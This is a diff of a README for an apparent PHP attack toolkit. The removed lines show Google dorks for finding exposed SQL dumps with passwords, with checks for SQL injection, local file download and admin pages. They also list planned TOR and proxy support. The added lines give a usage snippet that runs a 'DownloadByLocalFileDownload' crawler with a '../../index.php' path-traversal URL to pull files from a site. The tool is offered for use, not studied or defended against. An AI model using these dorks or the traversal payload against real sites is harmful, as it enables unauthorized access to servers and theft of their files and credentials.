@@ -1,6 +1,6 @@
 # Crawler Static File
 
-> Crawler Static File
+> ASZone - Crawler - Download File By Local File Download
 
 ### Beta
 
@@ -31,80 +31,17 @@ curl -sS https://getcomposer.org/installer | php
 Next, run the Composer command to install the latest beta version of Php Avenger SH:
 
 ```bash
-php composer.phar create-project aszone/avenger-sh
-cd avenger-sh
+php composer.phar create-project aszone/crawler/download-file-by-lfd
 ```
+
 ## Basic Usage
-
-> Use command for init process, result will print in monitor and save in txt on folder results.
-
-### Get trash search
-
 ```bash
-php avenger sh --dork="site:com.ar ext:sql password"
+$command=array();
+$url="http://www.xxxx.com/download.php?file=../../index.php";
+$crawler = new DownloadByLocalFileDownload($command,$url);
+$crawler->getAllFiles();
+
 ```
-#### Result of trash search
-![alt tag](http://lenonleite.com.br/wp-content/uploads/2016/06/imagem1.png)
-
-
-### Check Sql Injection
-```bash
-php avenger sh --dork="site:com.ar inurl:php?id=" --check="sqli"
-```
-#### Result of Sql Injection
-![alt tag](http://lenonleite.com.br/wp-content/uploads/2016/06/imagem2.png)
-![alt tag](http://lenonleite.com.br/wp-content/uploads/2016/06/imagem3.png)
-
-
-### Check Local File Download
-```bash
-php avenger sh --dork="site:com.ar inurl:download.php?file=" --check="lfd"
-```
-#### Result of Local File Download
-![alt tag](http://lenonleite.com.br/wp-content/uploads/2016/06/imagem7.png)
-
-
-### Check is Admin Page
-```bash
-php avenger sh --dork="site:com.ar inurl:admin" --check="isAdmin"
-```
-
-### Help for commands
-```bash
-php avenger sh
-```
-
-## Details
-
-#### Searchs Enginers
-* Google
-* GoogleApi
-* Bing
-* DukeDukeGo
-* Yahoo
-* Yandex
-
-#### Vulnerabilities Checked
-* Sql Injection
-* Local File Download
-* Admin Page
-
-#### Future Vulnerabilities Checked
-* RFI
-* Xss
-* Sensitive Files
-    * Dump Files
-    * Config Files
-    * Open Folders
-
-#### Features development
-* Power Search
-* Send Mail for results
-* Name of TXT
-* Proxys
-    * TOR
-    * Site of Proxys
-    * **Virgem Proxys**
 
 ## Help and docs
 * [Documentation](http://phpavenger.aszone.com.br).
